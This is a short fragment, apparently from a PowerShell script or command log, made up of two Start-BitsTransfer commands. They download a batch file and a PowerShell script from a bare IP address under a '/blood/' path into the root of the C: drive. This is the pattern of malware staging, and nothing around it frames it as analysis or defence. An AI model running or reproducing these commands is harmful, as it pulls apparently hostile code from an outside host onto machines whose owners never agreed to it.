...
Start-BitsTransfer -Source http://139.180.134.229/blood/run.bat -Destination C:\run.bat
Start-BitsTransfer -Source http://139.180.134.229/blood/runConfig.ps1 -Destination C:\runConfig.ps1
